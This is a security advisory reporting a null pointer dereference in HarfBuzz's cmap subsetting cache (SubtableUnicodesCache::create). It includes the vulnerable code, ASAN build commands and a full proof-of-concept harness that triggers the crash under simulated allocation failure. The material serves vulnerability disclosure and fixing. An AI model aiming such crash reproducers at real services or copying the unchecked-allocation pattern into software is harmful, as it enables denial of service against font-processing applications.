# HarfBuzz Null Pointer Dereference Vulnerability Report

## Summary

| Item | Details |
|------|---------|
| **Affected Version** | HarfBuzz 12.3.0 (earlier versions may also be affected) |
| **CWE** | CWE-476 (NULL Pointer Dereference) |
| **Impact** | DoS (Denial of Service) |
| **Vulnerable Function** | `OT::SubtableUnicodesCache::create()` |
| **Vulnerable File** | `src/hb-ot-cmap-table.hh:1672-1673` |

## 1. Background

This vulnerability occurs in the `SubtableUnicodesCache::create` function executed by `hb_subset_preprocess`. This function generates accelerator data for the cmap table to improve font subsetting performance.

HarfBuzz uses `failing-alloc.c` to simulate memory allocation failures in fuzzing environments. This file overrides the `hb_malloc_impl` function to return `NULL` with a probability of 1/16:

```c
void* hb_malloc_impl (size_t size)
{
  return (fastrand () % 16) ? malloc (size) : NULL;
}
```

## 2. Vulnerability Description and Impact

### Description

A null pointer dereference vulnerability exists in the `SubtableUnicodesCache::create` function located in `src/hb-ot-cmap-table.hh:1672-1673`. The function fails to check if `hb_malloc` returns `NULL` before using placement new to construct an object at the returned pointer address.

When `hb_malloc` fails to allocate memory (which can occur in low-memory conditions or when using custom allocators that simulate allocation failures), it returns `NULL`. The code then attempts to call the constructor on this null pointer using placement new syntax, resulting in undefined behavior and a Segmentation Fault.

### Impact

DoS can be triggered.

## 3. Scenario

The function prototype is as follows:

```cpp
// src/hb-ot-cmap-table.hh:1669-1675
static SubtableUnicodesCache* create (hb_blob_ptr_t<cmap> source_table)
{
  SubtableUnicodesCache* cache =
      (SubtableUnicodesCache*) hb_malloc (sizeof(SubtableUnicodesCache));
  new (cache) SubtableUnicodesCache (source_table);  
  return cache;
}
```

The vulnerable part is:

```cpp
SubtableUnicodesCache* cache =
    (SubtableUnicodesCache*) hb_malloc (sizeof(SubtableUnicodesCache));
new (cache) SubtableUnicodesCache (source_table);  
```

The types of each operand are:

`hb-ot-cmap-table.hh`:

```cpp
static SubtableUnicodesCache* create (hb_blob_ptr_t<cmap> source_table)
```

`hb.hh`:

```cpp
void* hb_malloc (size_t size);  
```

Although all operands are pointer types, there is no null check for the return value of `hb_malloc`, causing placement new to be executed on a null pointer.

## 4. How to Reproduce

Build with ASAN:

```bash
meson setup fuzzbuild -Dfuzzer_ldflags="-fsanitize=address,undefined,fuzzer"
meson compile -C fuzzbuild repro
```

PoC code is located in `test/fuzzing/repro.cc` file.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "hb.h"
#include "hb-ot.h"
#include "hb-subset.h"

extern "C" int alloc_state;

static inline int
_fuzzing_alloc_state (const uint8_t *data, size_t size)
{
  if (size && data[size - 1] < 0x80)
    return 0;
  return size;
}

static const hb_tag_t feature_tags[] = {
  HB_TAG('l','i','g','a'),
  HB_TAG('k','e','r','n'),
  HB_TAG('c','a','l','t'),
  HB_TAG('s','m','c','p'),
  HB_TAG('c','c','m','p'),
  HB_TAG('l','o','c','l'),
  HB_TAG('m','a','r','k'),
  HB_TAG('m','k','m','k'),
};

static size_t encode_utf8(hb_codepoint_t cp, char *out)
{
  if (cp < 0x80) {
    out[0] = (char)cp;
    return 1;
  } else if (cp < 0x800) {
    out[0] = (char)(0xC0 | (cp >> 6));
    out[1] = (char)(0x80 | (cp & 0x3F));
    return 2;
  } else if (cp < 0x10000) {
    out[0] = (char)(0xE0 | (cp >> 12));
    out[1] = (char)(0x80 | ((cp >> 6) & 0x3F));
    out[2] = (char)(0x80 | (cp & 0x3F));
    return 3;
  } else {
    out[0] = (char)(0xF0 | (cp >> 18));
    out[1] = (char)(0x80 | ((cp >> 12) & 0x3F));
    out[2] = (char)(0x80 | ((cp >> 6) & 0x3F));
    out[3] = (char)(0x80 | (cp & 0x3F));
    return 4;
  }
}

static int test_pipeline(const uint8_t *data, size_t size,
                         const char *font_file)
{
  alloc_state = _fuzzing_alloc_state(data, size);

  if (size < 24) {
    fprintf(stderr, "Input data too small\n");
    return 1;
  }

  uint8_t subset_flags_byte = data[0];
  uint8_t shape_flags_byte = data[1];
  uint8_t unicode_count = (data[2] % 16) + 1;
  uint8_t face_index = data[3];
  uint8_t direction_byte = data[4] % 4;
  uint8_t script_byte = data[5];
  uint8_t feature_mask = data[6];
  uint8_t extra_flags = data[7];
  uint8_t cluster_level = data[8] % 4;
  uint8_t serialize_format = data[9] % 2;

  size_t header_size = 12;
  size_t unicode_size = unicode_count * 3;
  size_t min_size = header_size + unicode_size;

  if (size < min_size) {
    fprintf(stderr, "Input data too small for header and unicode\n");
    return 1;
  }

  hb_codepoint_t codepoints[16];
  for (uint8_t i = 0; i < unicode_count; i++)
  {
    size_t offset = header_size + (i * 3);
    uint32_t cp = data[offset]
                | (data[offset + 1] << 8)
                | ((data[offset + 2] & 0x1F) << 16);
    codepoints[i] = (cp > 0x10FFFF) ? (cp % 0x10FFFF) : cp;
  }

  char utf8_text[16 * 4 + 1];
  size_t utf8_len = 0;
  for (uint8_t i = 0; i < unicode_count; i++)
  {
    utf8_len += encode_utf8(codepoints[i], utf8_text + utf8_len);
  }
  utf8_text[utf8_len] = '\0';

  hb_blob_t *blob = nullptr;
  if (font_file) {
    blob = hb_blob_create_from_file(font_file);
    if (!blob) {
      fprintf(stderr, "Failed to load font file: %s\n", font_file);
      return 1;
    }
  } else {
    size_t font_offset = min_size;
    size_t font_size = size - font_offset;
    if (size < font_offset) {
      fprintf(stderr, "Input data too small for font\n");
      return 1;
    }
    blob = hb_blob_create((const char *)data + font_offset,
                          font_size,
                          HB_MEMORY_MODE_READONLY, nullptr, nullptr);
  }
  
  hb_face_t *face = hb_face_create(blob, face_index % 16);

  hb_face_t *preprocessed_face = nullptr;
  if (extra_flags & 0x01)
  {
    preprocessed_face = hb_subset_preprocess(face);
  }
  hb_face_t *source_face = preprocessed_face ? preprocessed_face : face;

  hb_subset_input_t *input = hb_subset_input_create_or_fail();
  if (!input)
  {
    if (preprocessed_face) hb_face_destroy(preprocessed_face);
    hb_face_destroy(face);
    hb_blob_destroy(blob);
    return 1;
  }

  hb_set_t *unicodes = hb_subset_input_unicode_set(input);
  for (uint8_t i = 0; i < unicode_count; i++)
  {
    hb_set_add(unicodes, codepoints[i]);
  }

  hb_set_t *glyph_set = hb_subset_input_glyph_set(input);
  for (uint8_t i = 0; i < (unicode_count / 2); i++)
  {
    hb_set_add(glyph_set, codepoints[i] % 256);
  }

  hb_subset_flags_t subset_flags = (hb_subset_flags_t)(
    (subset_flags_byte & 0x01 ? HB_SUBSET_FLAGS_NO_HINTING : 0) |
    (subset_flags_byte & 0x02 ? HB_SUBSET_FLAGS_RETAIN_GIDS : 0) |
    (subset_flags_byte & 0x04 ? HB_SUBSET_FLAGS_DESUBROUTINIZE : 0) |
    (subset_flags_byte & 0x08 ? HB_SUBSET_FLAGS_NAME_LEGACY : 0) |
    (subset_flags_byte & 0x10 ? HB_SUBSET_FLAGS_SET_OVERLAPS_FLAG : 0) |
    (subset_flags_byte & 0x20 ? HB_SUBSET_FLAGS_PASSTHROUGH_UNRECOGNIZED : 0) |
    (subset_flags_byte & 0x40 ? HB_SUBSET_FLAGS_NOTDEF_OUTLINE : 0) |
    (subset_flags_byte & 0x80 ? HB_SUBSET_FLAGS_GLYPH_NAMES : 0)
  );
  hb_subset_input_set_flags(input, subset_flags);

  if (extra_flags & 0x02)
  {
    hb_subset_input_keep_everything(input);
  }

  hb_tag_t axis_tags[] = {
    HB_TAG('w','g','h','t'),
    HB_TAG('w','d','t','h'),
    HB_TAG('o','p','s','z'),
    HB_TAG('s','l','n','t'),
  };
  if (size > min_size + 8)
  {
    for (unsigned i = 0; i < 4 && i < (size - min_size) / 2; i++)
    {
      float value = (float)((int)(data[10 + i] - 128)) * 4.0f;
      (void)hb_subset_input_pin_axis_location(input, face, axis_tags[i], value);
    }
  }

  hb_face_t *subset_face = hb_subset_or_fail(source_face, input);
  hb_subset_input_destroy(input);

  hb_face_t *working_face = subset_face ? subset_face : hb_face_reference(source_face);

  if (subset_face)
  {
    hb_blob_t *subset_blob = hb_face_reference_blob(subset_face);
    unsigned int blob_length;
    const char *blob_data = hb_blob_get_data(subset_blob, &blob_length);
    volatile unsigned int checksum = 0;
    for (unsigned int i = 0; i < blob_length && i < 256; i++)
      checksum += (unsigned char)blob_data[i];
    (void)checksum;
    hb_blob_destroy(subset_blob);
  }

  hb_font_t *font = hb_font_create(working_face);
  hb_font_set_scale(font, 1000, 1000);

  unsigned int num_axes = hb_ot_var_get_axis_count(working_face);
  if (num_axes > 0 && size > min_size + 4)
  {
    unsigned int coords_count = (num_axes > 4) ? 4 : num_axes;
    float *coords = (float *)calloc(coords_count, sizeof(float));
    if (coords)
    {
      for (unsigned int i = 0; i < coords_count; i++)
        coords[i] = (float)((int)(data[10 + i] - 128)) / 64.0f;
      hb_font_set_var_coords_design(font, coords, coords_count);
      free(coords);
    }
  }

  hb_buffer_t *buffer = hb_buffer_create();

  hb_buffer_set_cluster_level(buffer, (hb_buffer_cluster_level_t)cluster_level);

  hb_buffer_add_utf8(buffer, utf8_text, (int)utf8_len, 0, (int)utf8_len);

  hb_direction_t direction;
  switch (direction_byte) {
    case 0: direction = HB_DIRECTION_LTR; break;
    case 1: direction = HB_DIRECTION_RTL; break;
    case 2: direction = HB_DIRECTION_TTB; break;
    case 3: direction = HB_DIRECTION_BTT; break;
    default: direction = HB_DIRECTION_LTR; break;
  }
  hb_buffer_set_direction(buffer, direction);

  static const hb_script_t scripts[] = {
    HB_SCRIPT_LATIN, HB_SCRIPT_ARABIC, HB_SCRIPT_HANGUL, HB_SCRIPT_HAN,
    HB_SCRIPT_HIRAGANA, HB_SCRIPT_DEVANAGARI, HB_SCRIPT_THAI, HB_SCRIPT_HEBREW,
  };
  hb_buffer_set_script(buffer, scripts[script_byte % 8]);

  static const char *languages[] = {"en", "ko", "ja", "zh", "ar", "he", "th", "hi"};
  hb_buffer_set_language(buffer, hb_language_from_string(languages[script_byte % 8], -1));

  hb_buffer_flags_t buffer_flags = HB_BUFFER_FLAG_DEFAULT;
  if (shape_flags_byte & 0x01) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_BOT);
  if (shape_flags_byte & 0x02) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_EOT);
  if (shape_flags_byte & 0x04) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_PRESERVE_DEFAULT_IGNORABLES);
  if (shape_flags_byte & 0x08) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_REMOVE_DEFAULT_IGNORABLES);
  if (shape_flags_byte & 0x10) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_DO_NOT_INSERT_DOTTED_CIRCLE);
  if (shape_flags_byte & 0x20) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_VERIFY);
  if (shape_flags_byte & 0x40) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_PRODUCE_UNSAFE_TO_CONCAT);
  if (shape_flags_byte & 0x80) buffer_flags = (hb_buffer_flags_t)(buffer_flags | HB_BUFFER_FLAG_PRODUCE_SAFE_TO_INSERT_TATWEEL);
  hb_buffer_set_flags(buffer, buffer_flags);

  hb_buffer_set_invisible_glyph(buffer, 0);
  hb_buffer_set_not_found_glyph(buffer, 0);

  hb_buffer_guess_segment_properties(buffer);

  hb_feature_t features[8];
  unsigned int num_features = 0;
  for (unsigned int i = 0; i < 8; i++)
  {
    if (feature_mask & (1 << i))
    {
      features[num_features].tag = feature_tags[i];
      features[num_features].value = (extra_flags & 0x04) ? 0 : 1;
      features[num_features].start = 0;
      features[num_features].end = (unsigned int)-1;
      num_features++;
    }
  }

  const char *shapers[] = {"ot", nullptr};
  (void)hb_shape_full(font, buffer, features, num_features,
                      (extra_flags & 0x08) ? shapers : nullptr);

  if ((extra_flags & 0x10) && hb_buffer_get_content_type(buffer) == HB_BUFFER_CONTENT_TYPE_GLYPHS)
  {
    hb_buffer_normalize_glyphs(buffer);
  }

  if ((extra_flags & 0x20) && hb_buffer_get_content_type(buffer) == HB_BUFFER_CONTENT_TYPE_GLYPHS)
  {
    char serialize_buf[4096];
    unsigned int buf_consumed = 0;
    hb_buffer_serialize_format_t fmt = serialize_format ?
      HB_BUFFER_SERIALIZE_FORMAT_JSON : HB_BUFFER_SERIALIZE_FORMAT_TEXT;

    unsigned int num_serialized = hb_buffer_serialize_glyphs(
      buffer, 0, hb_buffer_get_length(buffer),
      serialize_buf, sizeof(serialize_buf), &buf_consumed,
      font, fmt, HB_BUFFER_SERIALIZE_FLAG_DEFAULT);

    if (num_serialized > 0)
    {
      hb_buffer_t *buffer2 = hb_buffer_create();
      (void)hb_buffer_deserialize_glyphs(buffer2, serialize_buf, (int)buf_consumed,
                                         nullptr, font, fmt);
      hb_buffer_destroy(buffer2);
    }
  }

  if (extra_flags & 0x40)
  {
    hb_buffer_reverse(buffer);
  }

  unsigned int glyph_count;
  hb_glyph_info_t *glyph_info = hb_buffer_get_glyph_infos(buffer, &glyph_count);
  hb_glyph_position_t *glyph_pos = hb_buffer_get_glyph_positions(buffer, &glyph_count);

  volatile hb_codepoint_t sum = 0;
  for (unsigned int i = 0; i < glyph_count && i < 16; i++)
  {
    sum += glyph_info[i].codepoint;
    sum += (hb_codepoint_t)glyph_pos[i].x_advance;
  }
  (void)sum;

  hb_buffer_destroy(buffer);
  hb_font_destroy(font);
  hb_face_destroy(working_face);
  if (preprocessed_face)
    hb_face_destroy(preprocessed_face);
  hb_face_destroy(face);
  hb_blob_destroy(blob);

  return 0;
}

static int read_file(const char *filename, uint8_t **data, size_t *size)
{
  FILE *f = fopen(filename, "rb");
  if (!f) {
    perror("fopen");
    return 1;
  }

  fseek(f, 0, SEEK_END);
  long file_size = ftell(f);
  fseek(f, 0, SEEK_SET);

  *data = (uint8_t *)malloc(file_size);
  if (!*data) {
    fclose(f);
    fprintf(stderr, "Failed to allocate memory\n");
    return 1;
  }

  size_t read_size = fread(*data, 1, file_size, f);
  fclose(f);

  if (read_size != (size_t)file_size) {
    free(*data);
    fprintf(stderr, "Failed to read file completely\n");
    return 1;
  }

  *size = read_size;
  return 0;
}

int main(int argc, char **argv)
{
  if (argc < 2) {
    fprintf(stderr, "Usage: %s <input_file> [font_file]\n", argv[0]);
    fprintf(stderr, "  input_file: Input data file (containing flags and unicode points)\n");
    fprintf(stderr, "  font_file: Optional font file (if not provided, font is read from input_file)\n");
    return 1;
  }

  uint8_t *data = nullptr;
  size_t size = 0;

  if (read_file(argv[1], &data, &size)) {
    return 1;
  }

  const char *font_file = (argc > 2) ? argv[2] : nullptr;
  int result = test_pipeline(data, size, font_file);

  free(data);
  return result;
}

```

